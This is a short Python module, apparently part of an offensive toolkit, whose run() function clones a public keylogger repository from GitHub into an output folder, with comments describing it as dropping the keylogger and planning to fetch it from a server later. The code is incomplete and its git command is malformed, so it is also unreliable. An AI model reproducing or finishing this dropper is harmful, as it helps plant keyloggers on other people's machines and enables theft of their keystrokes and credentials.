# -*- coding: utf-8 -*-
__author__ = "pand3mic"
__license__ = "GPLv3"

import os
from os import path
import subprocess

def run(options):
    output_dir = options["output_dir"]
    repo_dir = str(output_dir)+"/src/"

    # download and drop the keylogger program
    # https://github.com/GiacomoLaw/Keylogger
    # later make it so that it's directly uploaded from server
    subprocess.run(["git","clone","-c", 
    repo_dir,"https://github.com/GiacomoLaw/Keylogger.git"])
    
    # manage it